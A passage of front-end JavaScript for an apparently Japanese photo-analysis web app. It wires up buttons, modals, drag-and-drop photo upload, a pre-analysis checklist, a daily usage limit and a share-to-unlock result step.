        if (unlockShareBtn) unlockShareBtn.textContent = "共有して結果を表示";
      }, 1200);
    } catch (_error) {
      shareBtn.textContent = "共有に失敗";
      if (unlockShareBtn) unlockShareBtn.textContent = "共有に失敗";
      setTimeout(() => {
        shareBtn.textContent = "サイトをシェア";
        if (unlockShareBtn) unlockShareBtn.textContent = "共有して結果を表示";
      }, 1200);
      return;
    }
  }

  if (shared) {
    revealResult();
    if (unlockShareBtn) unlockShareBtn.textContent = "結果を表示しました";
  }
}

startBtn.addEventListener("click", openNoticeModal);
cancelNoticeBtn.addEventListener("click", closeNoticeModal);
noticeModal.addEventListener("click", (event) => {
  if (event.target === noticeModal) closeNoticeModal();
});
analyzeCheckModal.addEventListener("click", (event) => {
  if (event.target === analyzeCheckModal) closeAnalyzeCheckModal();
});

agreeCheck.addEventListener("change", () => {
  confirmNoticeBtn.disabled = !agreeCheck.checked;
});

confirmNoticeBtn.addEventListener("click", () => {
  closeNoticeModal();
  if (isDailyLocked()) {
    updateDailyLimitUI();
    return;
  }
  setScreen("photo");
});

backToWelcomeBtn.addEventListener("click", () => {
  setScreen("welcome");
});

photoInput.addEventListener("change", (event) => {
  updatePreview(event.target.files?.[0]);
});
["dragenter", "dragover"].forEach((name) => {
  uploadArea.addEventListener(name, (event) => {
    event.preventDefault();
    uploadArea.classList.add("dragging");
  });
});

["dragleave", "drop"].forEach((name) => {
  uploadArea.addEventListener(name, (event) => {
    event.preventDefault();
    uploadArea.classList.remove("dragging");
  });
});

uploadArea.addEventListener("drop", (event) => {
  updatePreview(event.dataTransfer?.files?.[0]);
});

userName.addEventListener("input", validateInput);
analyzeBtn.addEventListener("click", openAnalyzeCheckModal);
checkOwnPhoto.addEventListener("change", updateAnalyzeCheckState);
checkNoFilter.addEventListener("change", updateAnalyzeCheckState);
checkFaceVisible.addEventListener("change", updateAnalyzeCheckState);
cancelAnalyzeCheckBtn.addEventListener("click", closeAnalyzeCheckModal);
confirmAnalyzeCheckBtn.addEventListener("click", () => {
  closeAnalyzeCheckModal();
  runAnalysis();
});
saveBtn.addEventListener("click", saveResult);
shareBtn.addEventListener("click", shareSite);
if (unlockShareBtn) unlockShareBtn.addEventListener("click", shareSite);

setScreen("welcome");
validateInput();
updateDailyLimitUI();
